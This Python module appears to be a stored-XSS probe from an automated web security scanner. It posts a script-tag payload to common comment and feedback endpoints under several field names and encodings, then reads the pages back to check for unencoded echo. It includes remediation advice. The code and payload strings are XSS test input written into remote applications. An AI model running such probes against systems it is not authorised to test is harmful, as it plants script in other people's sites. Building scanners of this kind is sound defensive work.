"""Stored XSS via POST + GET round-trip.

Many feedback, comment, and review endpoints persist user-supplied HTML
verbatim. If the server stores the raw payload and a later GET on the
same collection returns it without HTML-encoding, any reader's browser
executes attacker-controlled script. That is stored XSS.

The probe is two-step. It POSTs a benign-but-distinctive `<script>` tag
to a candidate endpoint with the comment field tried under several
common names (`comment`, `text`, `content`, `message`, `body`). On a
2xx, it GETs the same collection (and the per-id URL when a numeric or
string id surfaces in the POST response) and looks for the literal
payload echoed unencoded.

Severity is high. The destructive-low tag reflects that the probe
writes one short comment per accepted endpoint, no account creation,
no privileged action.
"""
from __future__ import annotations

import json
import re
from typing import Any

from engine.probes import ProbeContext, registry
from engine.probes.auth.runner import auth_headers
from engine.probes.primitives import http_get, http_post_form, http_post_json

# Common feedback / comment sinks across modern stacks (Juice Shop,
# generic Express CRUD, Rails, Django REST scaffolds). Numeric-id
# entries cover Flask-style same-URL POST+GET sinks where the comment
# round-trip happens on /tasks/<int>, /posts/<int>, /topics/<int>.
DEFAULT_CANDIDATES: tuple[str, ...] = (
    "/api/Feedbacks",
    "/api/Comments",
    "/api/Reviews",
    "/api/Posts",
    "/comments",
    "/tasks/1",
    "/tasks/2",
    "/tasks/3",
    "/posts/1",
    "/topics/1",
)

# Field names tried for the comment body. The server only needs one to
# match, so we POST once per name until something sticks.
COMMENT_FIELDS: tuple[str, ...] = (
    "comment",
    "text",
    "content",
    "message",
    "body",
)

SCRIPT_PAYLOAD = "<script>alert('ptai')</script>"
IFRAME_PAYLOAD = "<iframe src=\"javascript:"

# Status codes that count as a successful write. 200 covers servers that
# return the created object on POST; 201 is the textbook Created.
_OK_POST = (200, 201)


def _parse_json(body: str) -> Any:
    try:
        return json.loads(body)
    except (ValueError, TypeError):
        return None


_MISSING = object()


def _walk_for_field(blob: Any, key: str) -> Any:
    """Depth-first search for `key` inside a parsed JSON blob."""
    if isinstance(blob, dict):
        if key in blob:
            return blob[key]
        for v in blob.values():
            found = _walk_for_field(v, key)
            if found is not _MISSING:
                return found
    elif isinstance(blob, list):
        for item in blob:
            found = _walk_for_field(item, key)
            if found is not _MISSING:
                return found
    return _MISSING


def _extract_id(parsed: Any) -> str | None:
    """Pull a usable id out of a POST response, or None."""
    for key in ("id", "_id", "uuid"):
        found = _walk_for_field(parsed, key)
        if found is _MISSING or found is None:
            continue
        if isinstance(found, (str, int)):
            return str(found)
    return None


def _payload_present(body: str) -> str | None:
    """Return the matched payload string if echoed unencoded, else None."""
    if SCRIPT_PAYLOAD in body:
        return SCRIPT_PAYLOAD
    if IFRAME_PAYLOAD in body:
        return IFRAME_PAYLOAD
    return None


def _emit(target: str, evidence: str, field: str) -> dict[str, Any]:
    return {
        "title": f"Stored XSS: {field!r} field rendered unencoded on read-back",
        "severity": "high",
        "category": "injection",
        "target": target,
        "evidence": evidence[:512],
        "bug_class": "xss_stored",
        "remediation": (
            "HTML-encode user-supplied text on output. Apply a strict "
            "Content-Security-Policy that forbids inline script. Reject "
            "or sanitise HTML at the persistence boundary using a "
            "proven library (DOMPurify, bleach) instead of regex filters."
        ),
    }


def _build_payload(field: str) -> dict[str, Any]:
    return {field: SCRIPT_PAYLOAD, "rating": 1}


# Match the literal payload near surrounding text in any echo response,
# including bodies that wrap it in JSON. We rely on substring presence
# (see _payload_present); the regex below is reserved for future use.
_PAYLOAD_RE = re.compile(re.escape(SCRIPT_PAYLOAD))


async def _post_payload(
    session: Any, url: str, field: str, shape: str, extra: dict[str, str],
) -> tuple[int, str]:
    """POST {field: SCRIPT_PAYLOAD, rating: 1} as JSON or form. Returns (status, body)."""
    payload = _build_payload(field)
    if shape == "json":
        status, _, body = await http_post_json(
            session, url, payload, headers=extra or None,
        )
    else:
        status, _, body = await http_post_form(
            session, url, payload, headers=extra or None,
        )
    return status, body


@registry.probe(
    name="web.stored_xss",
    bug_class="xss_stored",
    severity_max="high",
    owasp="A03:2021",
    runtime_budget_s=10.0,
    tags=("anonymous", "high-roi", "destructive-low"),
    requires_auth=False,
)
async def probe_stored_xss(ctx: ProbeContext) -> list[dict[str, Any]]:
    """Two-step probe: POST a script payload, then GET to confirm echo.

    For each candidate path the probe tries each (shape, field-name)
    combination. After every accepted POST it immediately GETs the same
    URL (and /{id} when the POST response yields an id) and emits a
    finding on first unencoded echo. Both shapes (JSON, form-urlencoded)
    are tried because modern REST endpoints take JSON while Flask-style
    form handlers want application/x-www-form-urlencoded.
    """
    candidates = list(dict.fromkeys(
        list(DEFAULT_CANDIDATES) + list(ctx.candidate_endpoints or ())
    ))
    base = ctx.base
    extra = auth_headers(ctx.captured_auth)
    findings: list[dict[str, Any]] = []
    seen: set[str] = set()

    for path in candidates:
        url = path if path.startswith(("http://", "https://")) else base + path

        fired_here = False
        for shape in ("json", "form"):
            if fired_here:
                break
            for field_name in COMMENT_FIELDS:
                status, body = await _post_payload(
                    ctx.session, url, field_name, shape, extra,
                )
                if status not in _OK_POST:
                    continue
                post_parsed = _parse_json(body)
                read_urls: list[str] = [url]
                record_id = _extract_id(post_parsed)
                if record_id:
                    read_urls.append(f"{url.rstrip('/')}/{record_id}")

                for read_url in read_urls:
                    if read_url in seen:
                        continue
                    r_status, _, r_body = await http_get(
                        ctx.session, read_url, headers=extra or None,
                    )
                    if r_status != 200 or not r_body:
                        continue
                    matched = _payload_present(r_body)
                    if matched is None:
                        continue
                    seen.add(read_url)
                    findings.append(_emit(read_url, matched, field_name))
                    fired_here = True
                    break
                if fired_here:
                    break

    return findings
